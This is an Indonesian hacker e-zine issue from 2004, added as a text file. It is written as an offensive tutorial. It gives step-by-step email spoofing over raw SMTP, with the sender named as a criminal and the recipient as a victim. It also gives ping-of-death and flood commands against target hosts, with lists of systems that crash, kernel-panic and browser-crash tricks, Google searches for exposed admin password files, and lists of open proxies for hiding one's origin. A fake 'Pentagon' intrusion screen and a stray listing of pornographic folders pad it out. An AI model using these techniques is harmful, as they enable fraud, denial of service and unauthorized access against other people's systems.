@@ -1,0 +1,893 @@
+    	____________________   ___ ___ ________
+	\_   _____/\_   ___ \ /   |   \\_____  \
+	 |    __)_ /    \  \//    ~    \/   |   \
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE
+       05
+
+Author: basher13 || basher13@stardawn.net
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+== Stardawn#1  ==
+
+
+
+
+#Include :
+
+
+  1.Chapter:
+    -.Fakemail melalui telnet
+
+  2.Chapter:
+    -.Ping Flood dengan lokal machine windows 95
+    -.Crashing Ping Flood dengan windows 95
+
+  3.Chapter:
+    -.KERNEL PANIC UNDER SOLARIS 2.3
+    -.Core Dump  NETSCAPE
+
+  4.Chapter:
+    -.Spying password web admin
+    -.telnet antihack
+
+  5.Chapter:
+    -. hidden directory
+
+  6.Chapter:
+    -.Dos Trick
+  7.Chapter:
+    -.Gambaran  Phone Hack tools
+
+
+
+
+
+..#1.Chapter
+*[ Fakemail melalui telnet ].
+
+
+   buka komputer anda dan buka 'start'tombol di 'windows toolbar'
+   Pilih 'run' untuk membuka program telnet (ketik 'telnet')
+   Setelah telnet telah tersedia ,segera untuk megirim FakeMail,dibawah
+   ini sudah gambaran telnet berikut cara meng-FakeMail melalui telnet:
+
+
+
+
+=======================================================================================
+C:\WINDOWS\Ssytem32\telnet.exe							     
+=======================================================================================
+Welcome to Microsoft Telnet Client						     
+										      
+Escape Character is 'CTRL+J'							
+										     
+Microsoft Telnet>								      
+---> ketik 'o' = Untuk connect ke server yang dituju. 				     
+< to > 										      
+--->ketik 'mail.korban.com 25' = mail server yang dituju                  
+          
+< to > mail.korban.com 25                                                 
+           
+Connecting To mail.korban.com...                                          
+          
+Connected...                                                              
+          
+                                                                                     
+Mail.korban.com is xxx.xxx.xxx                                            
+          
+--->ketik 'helo mail.terserahkamu.com'                                    
+         
+Helo mail.terserahkamu.com pleased to meet you                            
+          
+										     
+--->ketik 'mail from':(nama sang korban )@terserah.com'=Contoh 'mail from:
+          
+penjahat@korup.com'.								     
+OK                                                                        
+          
+										     
+--->ketik 'rctp to':(nama sang korban)@terserah.com' =Contoh 'rcpt
+to:korban@        
+terserah.com'.									     
+										      
+OK										     								                      |
+--->ketik 'Subject:'= isi dengan judul pesan mail			             
+--->ketik 'From:'= isi nama terserah anda,contoh:penjahat
+<penjahat@korup.com>        
+--->ketik 'X-Mailer:'= tulis mailer ,seperti :Micorosft outlook = hal ini
+dikarena    
+kan jika email tersebut tidak terkirim/atau sang korban ingin
+membalas,secara oto
+matis X-Mailer akan menampik/mengirim kembali email ke  pengirim email
+tersebut.     
+--->ketik apa yang anda ingin tulis untuk pesan email                     
+          
+.......bla.....................................                            
+          
+..............................bla..............                            
+          
+............................................                               
+           
+........bla....................................                            
+          
+                                                                                      
+Dari,                                                                     
+          
+Yang terhormat bla..bla                                                   
+           
+                                                                                    
+                                                                                    
+--->klik enter 2x untuk mengakhiri email                                  
+          
+                                                                                    
+Send 37368232982 ,OK                                                      
+          
+                                                                                      
+--->ketik 'Quit' =Disconnect dari mail server                             
+          
+                                                                                     
+                                                                                     
+=======================================================================================
+
+
+
+
+
+
+..#2.Chapter
+*[ Ping Flood dengan lokal machine windows 95 ]
+
+
+ Saya Sering kali menggunakan atau untuk membuat sebuah PING ke
+sebuah mesin windows 95 
+ Dengan Unix kita dapat mengirim melalui : ping -s host
+(Untuk mengirim 64 bytes packets)
+
+
+ jika anda memakai windows 95,klik 'start' button/tombol,lalu pilih 'Run'
+,dan mengetik/menulis langsung  'PING -T -L 256 xxx.xxx.xxx.xx.Start about 15
+sessions.
+
+
++  =====================================
+   RUN
+   ------------------------------------
+
+         ------------------------------
+   Open:|PING -T -L 256 xxx.xxx.xxx.xx.|
+         ------------------------------
+
+                   Ok | Cancel | Browse
+
+   =====================================
+
+
+
+
+*[ Crashing Ping Flood dengan windows 95   ]
+
+
+jika seseorang mampu membuat PING terhadap mesin pribadi komputer anda
+melalui windows 95,sehingga komputer anda seperti 'freeze atau 
+me-reboot ulang'windows.Sang penyerang menulis seperti berikut:
+
+
+ping -l 65510 alamat.yang.di.tuju
+
+
++  ========================================
+   RUN
+   ----------------------------------------
+
+         ---------------------------------
+   Open:|ping -l 65510 alamat.yang.di.tuju|
+         ---------------------------------
+
+                      Ok | Cancel | Browse
+
+   ========================================
+
+
+Dapat digunakan oleh kernel 2.0.7 sampai version 2.0.20.dan 2.1.1.untuk
+Linux (crash).
+AIX4, OSF, HPUX 10.1, DUnix 4.0 (crash).
+OSF/1, 3.2C, Solaris 2.4 x86 (reboot).
+
+
+
+
+
+
+
+..#3.Chapter
+*[ KERNEL PANIC UNDER SOLARIS 2.3 ]
+
+Solaris 2.3 akan mendapatkan kernel panik jika di eksekusi,contoh :
+
+        $ndd /dev/udp udp_status
+
+
+Solusi ini akan menginstall kembali pacth tersebut.
+
+
+
+
+*[ Core Dump  NETSCAPE ]
+
+
+Dibawah Netscape 1.1N dengan link tersebut akan mengakibatkan 'core dump'.
+
+Contoh :
+
+
+<a name="http://xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.
+	xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxxxxx.xxx.xxx.
+	xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxxxxx.xxx.xxx.xxx.xxx.xxx.
+	xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxxxxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.xxx.
+	xxx.xxx.xxx.xxx.xxxxxx.xxx.xxx.xxx.xxx.xxx...>
+
+
+
+
+
+..#4.Chapter
+*[ Spying password web admin ]
+
+
+Buka web browser anda dan arahkan ke www.google.com.Di kotak search ketik
+beberapa
+kata untuk mendapatkan password ,yang perlu diketik :
+
+"admin/password"
+"admin/password.txt"
+"admin/+password"
+"admin/pass"
+
+
+               -----------------
+   Search for :|admin/password |   | Search |
+               -----------------
+
+
+
+
+
+Seperti yang anda temukan anda akan mendapatkan beberapa situs yang
+berisikan folder
+dengan penuh file yang dirahasiakan oleh password
+
+
+
+
+
+
+*[ telnet antihack ]
+
+
+Ada aja cara para hacker untuk meng-hack suatu PC, salah satunya dengan 
+memakai telnet. Tentunya kita tidak ingin PC kita di telnet oleh orang - 
+orang yang enggak bertanggung jawab.
+
+Ini tips tricknya, dengan mengedit file /etc/hosts.allow menambahkan syntax :
+
+ALL : 127.0.0.1
+
+dan mengedit file /etc/hosts.deny dengan menambahkan syntax :
+
+ALL : ALL
+
+Yang artinya, hanya memperbolehkan 127.0.0.1 atau localhost saja yang bisa
+men-telnet, luar
+ dari itu tidak diijinkan men-telnet.
+
+Atau jika memang hanya IP tertentu saja yang bisa men-telnet, berikan
+syntax ini pada file
+/etc/hosts.allow :
+
+ALL : 100.0.0.1 ALLOW
+
+ALL : 127.0.0.1 ALLOW
+
+ALL : ALL: DENY
+
+Syntax itu berarti hanya mengijinkan localhost 127.0.0.1 dan IP 100.0.0.1
+saja yang dapat
+ men-telnet PC tersebut.
+
+
+
+
+
+
+..#5.Chapter
+*[ hidden directory ]
+
+
+  buka DOS command dan ketik
+
+    C:
+    cd\
+    md {tahan control ALT di numberpad anda} 255 <--- ini adalah ASCII
+NULL karakter
+    cd ALT 255
+
+Jika hal ini dilakukan bisa menyembunyikan diretory yang anda simpan
+selama ini
+
+
+
+
+
+..#6.Chapter
+*[ DOS trick ]
+
+
+*C:\Documents and Settings\Stardawn Network> [ kamuflase subfolder]
+buka command prompt anda melalui ,klik 'start',pilih 'run' dan tuliskan
+kata berikut
+ini
+
+
+Command Prompt
+
+
++  ========================================
+   RUN
+   ----------------------------------------
+
+         ---------------------------------
+   Open:|Command Prompt                   |
+         ---------------------------------
+
+                      Ok | Cancel | Browse
+
+   ========================================
+
+
+
+
+Akan  seperti ini:
+
+
+
+=======================================================================================
+Command Prompt						                               |
+=======================================================================================
+
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\Stardawn Network>
+--> ketik 'help' untuk help
+C:\Documents and Settings\Stardawn Network>help
+For more information on a specific command, type HELP command-name
+ASSOC    Displays or modifies file extension associations.
+AT       Schedules commands and programs to run on a computer.
+ATTRIB   Displays or changes file attributes.
+BREAK    Sets or clears extended CTRL+C checking.
+CACLS    Displays or modifies access control lists (ACLs) of files.
+CALL     Calls one batch program from another.
+CD       Displays the name of or changes the current directory.
+CHCP     Displays or sets the active code page number.
+CHDIR    Displays the name of or changes the current directory.
+CHKDSK   Checks a disk and displays a status report.
+CHKNTFS  Displays or modifies the checking of disk at boot time.
+CLS      Clears the screen.
+CMD      Starts a new instance of the Windows command interpreter.
+COLOR    Sets the default console foreground and background colors.
+COMP     Compares the contents of two files or sets of files.
+COMPACT  Displays or alters the compression of files on NTFS partitions.
+CONVERT  Converts FAT volumes to NTFS.  You cannot convert the
+         current drive.
+COPY     Copies one or more files to another location.
+DATE     Displays or sets the date.
+DEL      Deletes one or more files.
+DIR      Displays a list of files and subdirectories in a directory.
+DISKCOMP Compares the contents of two floppy disks.
+DISKCOPY Copies the contents of one floppy disk to another.
+DOSKEY   Edits command lines, recalls Windows commands, and creates macros.
+ECHO     Displays messages, or turns command echoing on or off.
+ENDLOCAL Ends localization of environment changes in a batch file.
+ERASE    Deletes one or more files.
+EXIT     Quits the CMD.EXE program (command interpreter).
+FC       Compares two files or sets of files, and displays the differences
+         between them.
+FIND     Searches for a text string in a file or files.
+FINDSTR  Searches for strings in files.
+FOR      Runs a specified command for each file in a set of files.
+FORMAT   Formats a disk for use with Windows.
+FTYPE    Displays or modifies file types used in file extension associations.
+GOTO     Directs the Windows command interpreter to a labeled line in a
+         batch program.
+GRAFTABL Enables Windows to display an extended character set in graphics
+         mode.
+HELP     Provides Help information for Windows commands.
+IF       Performs conditional processing in batch programs.
+LABEL    Creates, changes, or deletes the volume label of a disk.
+MD       Creates a directory.
+MKDIR    Creates a directory.
+MODE     Configures a system device.
+MORE     Displays output one screen at a time.
+MOVE     Moves one or more files from one directory to another directory.
+PATH     Displays or sets a search path for executable files.
+PAUSE    Suspends processing of a batch file and displays a message.
+POPD     Restores the previous value of the current directory saved by PUSHD.
+PRINT    Prints a text file.
+PROMPT   Changes the Windows command prompt.
+PUSHD    Saves the current directory then changes it.
+RD       Removes a directory.
+RECOVER  Recovers readable information from a bad or defective disk.
+REM      Records comments (remarks) in batch files or CONFIG.SYS.
+REN      Renames a file or files.
+RENAME   Renames a file or files.
+REPLACE  Replaces files.
+RMDIR    Removes a directory.
+SET      Displays, sets, or removes Windows environment variables.
+SETLOCAL Begins localization of environment changes in a batch file.
+SHIFT    Shifts the position of replaceable parameters in batch files.
+SORT     Sorts input.
+START    Starts a separate window to run a specified program or command.
+SUBST    Associates a path with a drive letter.
+TIME     Displays or sets the system time.
+TITLE    Sets the window title for a CMD.EXE session.
+TREE     Graphically displays the directory structure of a drive or path.
+TYPE     Displays the contents of a text file.
+VER      Displays the Windows version.
+VERIFY   Tells Windows whether to verify that your files are written
+         correctly to a disk.
+VOL      Displays a disk volume label and serial number.
+XCOPY    Copies files and directory trees.
+
+C:\Documents and Settings\Stardawn Network>
+--> ketik 'title [nama yg diinginkan]' untuk merubah title command promtp
+anda,dan
+anda bisa melihat bahwa tile dari dialog bar command prompt berubah
+menjadi 'nama yg diinginkan'
+
+C:\Documents and Settings\Stardawn Network>title [nama yg diinginkan]
+
+C:\Documents and Settings\Stardawn Network>
+--> ketik 'edit' ,untuk mengcomplie atau dicomplie suatu program dengan
+hanya membuka
+file asli atau mengdycrpt /encrpty suatu file dengan melihat source code
+C:\Documents and Settings\Stardawn Network>edit
+
+
+   File  Edit  Search  View  Options  Help
++-------------- C:\...\Stardawn Network\My Documents\mplogo.exe
+---------------+
+GIF89a ( �    f  �     � 3 3 f f �� 
+f33�333ff3�3f3�3�
+?�Ƣ�-M?S??#??                                                   
+    
+                                                                      
+    
+>K?}-0?)?+#++:+-(?+--+?-*+?G"+R++#+�-�?p?+f)t?a(r3�-?�?
+p+?+hn[?&G�}P g8?+a                                                 
+    
+9+?Tf+c+ll-$�&s6�+�/=rc-D;?f?C1rAIq?-?q?R-?)�n+a�u6�*'�+u
+b+?? !??IS?` $+--?^?A#_ +-Jk+r ,-V??   
++:+d?Ƭf?"�+-z-++
+?K1"+-f,+
+?=@++6k-+(\m?_d-=�n-?k�+?+w'\==+?t-+!=-�+t+/,+A�
++�h?4?P�pG +!+0�G??? Bf;S`?9p?,-Ż�??       -7�}?(??++F    
+    
+ h?hS"?yFB�,#/++Jvr?�'1I?02�vS?,YO2P<%(;�V�Ŧs)I)
+QN��$'?I\P
+                                                                         
+    
+                                                                         
+    
+                                                                         
+    
+                                                                         
+    
+                                                                         
+    
+                                                                         
+    
+                                                                         
+    
+                                                                         
+    
+                                                                         
+    
+                                                                         
+    
+                                                                         
+    
+                                                                         
+    ?
+ F1=Help                                               Line:1    Col:1
+
+
+
+
+
+
+
+C:\Documents and Settings\Stardawn Network>
+--> ketik 'ping -l 31377 [IP Address] ,gunanya untuk membuat-ping kepada
+seseorang yg berada
+di server lain dan hanya dapat diketahui numer IP address (127.0.0.1)
+
+C:\DOCUME~1\STARDA~1>ping -l 21300 127.0.0.1
+
+Pinging 127.0.0.1 with 21300 bytes of data:
+
+Reply from 127.0.0.1: bytes=21300 time<1ms TTL=32
+Reply from 127.0.0.1: bytes=21300 time<1ms TTL=32
+Reply from 127.0.0.1: bytes=21300 time<1ms TTL=32
+Reply from 127.0.0.1: bytes=21300 time=1ms TTL=32
+
+Ping statistics for 127.0.0.1:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 0ms, Maximum = 1ms, Average = 0ms
+
+
+
+
+
+C:\DOCUME~1\STARDA~1>ping
+
+Usage: ping [-t] [-a] [-n count] [-l size] [-f] [-i TTL] [-v TOS]
+            [-r count] [-s count] [[-j host-list] | [-k host-list]]
+            [-w timeout] target_name
+
+Options:
+    -t             Ping the specified host until stopped.
+                   To see statistics and continue - type Control-Break;
+                   To stop - type Control-C.
+    -a             Resolve addresses to hostnames.
+    -n count       Number of echo requests to send.
+    -l size        Send buffer size.
+    -f             Set Don't Fragment flag in packet.
+    -i TTL         Time To Live.
+    -v TOS         Type Of Service.
+    -r count       Record route for count hops.
+    -s count       Timestamp for count hops.
+    -j host-list   Loose source route along host-list.
+    -k host-list   Strict source route along host-list.
+    -w timeout     Timeout in milliseconds to wait for each reply.
+
+
+C:\DOCUME~1\STARDA~1>
+--> ketik 'finger' untuk finger seseorang dengan user@host
+C:\DOCUME~1\STARDA~1>finger -l basher13@31337.unixshell.com
+
+C:\DOCUME~1\STARDA~1>finger
+Displays information about a user on a specified system running the
+Finger service. Output varies based on the remote system.
+
+FINGER [-l] [user]@host [...]
+
+  -l        Displays information in long list format.
+  user      Specifies the user you want information about. Omit the user
+            parameter to display information about all users on the
+            specifed host.
+  @host     Specifies the server on the remote system whose users you
+            want information about.
+
+
+C:\DOCUME~1\STARDA~1>finger -l basher13@31337.unixshell.com
+
+C:\DOCUME~1\STARDA~1>
+--> ketik ' control inetcpl.cpl',untuk Setting Proxies
+pilih tab 'connection' ,dan click setting ,masukan nama daftar proxie
+berikut ini:
+
+    165.84.1.2:8080 bastion.chchpoly.ac.nz
+    203.97.2.246:8080 httpproxy1.clear.net.nz:8080
+    203.97.2.247:8080 httpproxy2.clear.net.nz:8080
+    192.65.90.243:8080
+    203.29.167.223:8080 cache.pcnet.co.nz:8080
+    203.2.75.29:8080 netman.mpx.com.au:8080
+    202.37.169.5:8080 proxy.acnielsen.co.nz:8080
+    202.37.173.1:8080 net.diocesan.school.nz:8080
+    203.24.77.246:3128 cache1.picknowl.com.au:3128
+    203.23.66.1:8080
+
+
+-click'Use a Proxy Server' dan masukkan no.IP atau nama server (salah
+    satu) beserta no. port. Contoh, seperti 165.84.1.2 Port 8080 atau
+    bastion.chchpoly.ac.nzPort 8080.
+
+-Cara satu lagi ialah apabila berhubung melalui ICQ. Bila kita click 'Info',
+    kita bisa lihat no. IP orang yg berbicara dengan kita.Cara ketiga ialah
+    pergi 'Start', 'Program', 'Dos Prompt'. Bila keluar C:\Windows,ketik
+'netstat'.
+    Kita akan lihat no. IP orang yang berhubung dengan kita melalui ICQ
+beserta
+    dengan nombor port. Eg. 202.188.63.130:3128 (3128 ialah nombor port).
+Kalau
+    orang niat jahat tahu IP dan no. Port, dia boleh membaca,membajak apa
+yang ada di
+    komputer kita.
+
+
+C:\Documents and Settings\Stardawn Network>netstat
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
+
+C:\Documents and Settings\Stardawn Network>
+
+-Bila kita surfing di internet, kita akan diberi satu nombor Internet
+Protocol
+    (IP), biasa nya secara automatik. Kita boleh mengenali ISP (Internet
+Service
+    Provider) seseorang itu melalui nombor IP. Contohnya, IP yang bermula
+dengan
+    202.188.xxx.xxx menggunakan ISP TMnet, dan IP 161.142.xxx.xxx menggunakan
+    ISP Jaring. Ada beberapa cara untuk mengetahui IP seseorang. Satu cara
+    apabila seseorang 'post message' di Message Board. Ada message board yg
+    terus paparkan no. IP orang yang 'post message'. Ada message board
+lain yang
+    tidak tunjukkan no.IP tetapi no.IP boleh d**e tahui dengan 'right click'
+    pada message, dan pilih 'View Source'.
+
+
+
+C:\DOCUME~1\STARDA~1>
+
+C:\DOCUME~1\STARDA~1>ECHO Yeah basher13 RuleZ AgaiN!
+Yeah basher13 RuleZ AgaiN!
+
+C:\DOCUME~1\STARDA~1>TREE
+Folder PATH listing for volume loadfix
+Volume serial number is 71FAE346 F417:E051
+C:.
++---Desktop
++---Favorites
+   +---Adult Sites
+      +---Amateur
+      +---Anal
+      +---Asian
+      +---Bisexual
+      +---Black
+      +---Cartoon
+      +---Cumshots
+      +---Fetish
+      +---Gang Bang
+      +---Gay
+      +---Hardcore
+      +---Interacial
+      +---Latin
+      +---Lesbian
+      +---Mature
+      +---Peeing
+      +---Reality
+      +---Teen
+      +---Teen Hardcore
+      +---Tits
+      +---Transexual
+      +---Upskirt
+      +---Video
+      +---Voyeur
+   +---Free Adult Content
+      +---Daily Movies
+      +---Daily Pictures
+      +---Free Live Chat
+   +---Links
++---My Documents
+   +---mploaogo
+   +---My Music
+   +---My Pictures
++---Start Menu
+    +---Programs
+        +---Accessories
+           +---Accessibility
+           +---Entertainment
+        +---Bulletproof FTP
+        +---FTP Navigator
+        +---Power Scan
+        +---RaidenFTPD
+        +---Startup
+
+C:\DOCUME~1\STARDA~1>
+
+
+
+-DOS Command untuk Memanggil sebuah program melalui 'Command Prompt'
+
+Contoh:
+...=Mouse Settings=: control main.cpl
+
+
+C:\Documents and Settings\Stardawn Network>control main.cpl
+--> ketik 'control main.cpl',untuk memanggil Mouse Settings
+
+
+Di bawah ini adalah program yagn bisa dipanggil melalui
+'command prompt':
+
+Nama Program | DOS command
+--------------------------
+
+=Notepad=: notepad
+=WordPad=: wordpad
+=MS Paint=: mspaint
+=Microsoft Word=: winword.exe
+=Microsoft Excel=: excel.exe
+..-
+Web Browser
+=IExplorer=: iexplore
+=Netscape=: netscape
+..Win Games
+=Solitaire=: sol
+=Hearts=: mshearts
+=FreeCell=: freecell
+=Win Mine=: winmine
+
+=Mouse Settings=: control main.cpl
+=Date/Time Settings=: control timedate.cpl
+=Desktop Settings=: control desk.cpl
+=Network Settings=: control netcpl.cpl
+=System Informations=: control sysdm.cpl
+=Internet Settings=: control inetcpl.cpl
+=Regional Settings=: control intl.cpl
+=Password Settings=: control password.cpl
+=Multimedia Settings=: control mmsys.cpl
+=Modem Settings=: control modem.cpl
+=More Control Panel=: control
+=Add/Remove Program=: control appwiz.cpl
+
+
+Untuk mempermudah pemanggilan suatu program,ada baiknya menggunakan cara
+berikut ini:
+
+Pilih 'start',buka 'run' di dalam box tersebut tuliskan beberapa command
+seperti yang
+diatas,mis;
+
++  ========================================
+   RUN
+   ----------------------------------------
+
+         ---------------------------------
+   Open:|control main.cpl                |
+         ---------------------------------
+
+                      Ok | Cancel | Browse
+
+   ========================================
+
+Ketik 'OK' atau tekan 'enter' untuk membuka prog terebut.
+
+
+=======================================================================================
+
+
+
+
+
+
+..#7.chapter
+*[ Gambaran  Phone Hack tools ]
+
+
+
+=======================================================================================
+C:\Phone Hack Tools\Temp\Hoax.exe					               |
+=======================================================================================
+                           Pentagon Central Info Net
+
+
+
+
+
+
+   /\
+ /    \
+ \____/ Pentagon Systems.
+
+ You have reached the Pentagon Central Network.
+
+WARNING!!!!!
+INCOMING CALLERS SUBJECT TO UNITED STATES MILITARY
+TRIBUNAL JUSTICE SYSTEM. FOREIGN ACCESS STRICTLY
+PROHIBITED.  ACCESS IS ON A NEED TO KNOW, EYES-ONLY
+BASIS FOR ALL BUT COMMAND AUTHORITY.  AT THIS POINT
+IMPROPER IDENTIFICATION WILL RESULT IN AUTOMATIC
+SURVEILLANCE OF CONNECTING TELEPHONE LINE AND INFORMATION
+SO GATHERED WILL BE PROVIDED TO THE PROPER LOCAL
+POLICE AND GOVERNMENTAL AGENCIES...................
+ACKNOWLEDGED? (Y/N) > Y
+
+
+
+
+
+Enter your personal identification code...
+=>XXXXXXX
+PROCESSING.....
+
+
+
+
+Enter your internal security access code...
+=>XXXXXXXX
+Verifying...
+
+
+Please repeat code for verification...
+=>XXXXXXXX
+PROCESSING.....
+
+
+
+
+Entering direct command mode. Please enter your
+ command level security password...
+
+=>X
+
+
+ ===Command mode active===
+
+Note- To log-off type "LOGOFF"
+
+
+
+>Yeah basher13 RuleZ AgaiN!
+
+
+
+
+
+
+ <>-<> SYSTEM ERROR <>-<>
+
+Failure on CPU 14, you will now be logged off.
+
+
+
+
+
+Pentagon 18......DISCONNECTING AT: 03/13/02    14:07:52 P
+/+�
+     ?R?+?�=/???+-OaKT
+NO CARRIER
+
+OK
+
+  |  F1-Dial menu, F2-Settings, F10-Exit  |   ON-LINE  |  2400, N81  | 
+FDX  |
+========================================================================================
+
+
+
+
+
+   				            - .EOF.-
+
+
+
+		***************************************************************
+		* E-zine Name....: Stardawn#1                                 *
+		* Author.........: basher13 <basher13@stardawn.net>           *
+		* Release Date...: 08 March 2004                              *
+		* Filename.......: Stardawn#1.txt                             *
+		* Web Site.......: http://www.stardawn.net                    *
+		***************************************************************
+		*                  Yeah basher13 RuleZ AgaiN!                 *
+		***************************************************************
+
+
+DISCLAIMER:
+
+Distribution of or allowing access to this program by uncleared
+individuals is strictly prohibited under penalty of federal law.
+
+Print: 'CTRL+P'
+2:12 PM 3/13/2004
+
+
